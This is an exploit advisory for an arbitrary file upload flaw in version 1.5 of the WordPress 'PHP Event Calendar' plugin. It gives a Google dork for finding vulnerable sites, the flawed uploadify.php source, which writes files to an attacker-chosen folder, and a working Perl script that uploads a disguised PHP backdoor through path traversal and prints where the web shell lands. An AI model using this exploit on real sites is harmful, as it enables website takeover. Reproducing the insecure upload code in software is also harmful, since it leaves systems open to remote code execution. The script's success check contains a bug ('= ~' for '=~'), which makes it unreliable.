# Google Dork: inurl:/plugins/php-event-calendar/
# Date: 02.04.2015
# Exploit Author: CrashBandicot (@DosPerl)
# Vendor HomePage: http://phpeventcalendar.com/
# Version: 1.5
# Tested on: MSwin
######################################################################

# Path of File : /wp-content/plugins/php-event-calendar/server/classes/uploadify.php
# Vulnerable File : uploadify.php

<?php
/*
Uploadify
Copyright (c) 2012 Reactive Apps, Ronnie Garcia
Released under the MIT License <http://www.opensource.org/licenses/mit-license.php> 
*/

// Define a destination
//$targetFolder = &#039;/uploads&#039;; // Relative to the root
$targetFolder = $_POST[&#039;targetFolder&#039;]; // wp upload directory
$dir = str_replace(&#039;\\&#039;,&#039;/&#039;,dirname(__FILE__));

//$verifyToken = md5(&#039;unique_salt&#039; . $_POST[&#039;timestamp&#039;]);

if (!empty($_FILES)) {
    $tempFile = $_FILES[&#039;Filedata&#039;][&#039;tmp_name&#039;];
    //$targetPath = $dir.$targetFolder;
    $targetPath = $targetFolder;
    $fileName = $_POST[&#039;user_id&#039;].&#039;_&#039;.$_FILES[&#039;Filedata&#039;][&#039;name&#039;];
    $targetFile = rtrim($targetPath,&#039;/&#039;) . &#039;/&#039; . $fileName;

    // Validate the file type
    $fileTypes = array(&#039;jpg&#039;,&#039;jpeg&#039;,&#039;gif&#039;,&#039;png&#039;); // File extensions
    $fileParts = pathinfo($_FILES[&#039;Filedata&#039;][&#039;name&#039;]);

    if (in_array($fileParts[&#039;extension&#039;],$fileTypes)) {
        move_uploaded_file($tempFile,$targetFile);
        echo &#039;1&#039;;
    } else {
        echo &#039;Invalid file type.&#039;;
    }
}
?>


# Exploit

#!/usr/bin/perl

use LWP::UserAgent;

system(($^O eq &#039;MSWin32&#039;) ? &#039;cls&#039; : &#039;clear&#039;);

print "\t   +===================================================\n";
print "\t   | PHP event Calendar Plugin - Arbitrary File Upload \n";
print "\t   | Author: CrashBandicot\n";
print "\t   +===================================================\n\n";

die "usage : perl $0 backdoor.php.gif" unless $ARGV[0];

 $file = $ARGV[0];

my $ua = LWP::UserAgent->new( agent => q{Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36},);
my $ch = $ua->post("http://127.0.0.1/wp-content/plugins/php-event-calendar/server/classes/uploadify.php", Content_Type => &#039;form-data&#039;, Content => [ &#039;Filedata&#039; => [$file] , targetFolder => &#039;../../../../../&#039; , user_id => &#039;0day&#039; ])->content;
if($ch = ~/1/) { 
print "\n  [+] File Uploaded !";
} else { print "\n  [-] Target not Vuln"; }

__END__


# Path Shell : http://localhost/0day_backdoor.php.gif

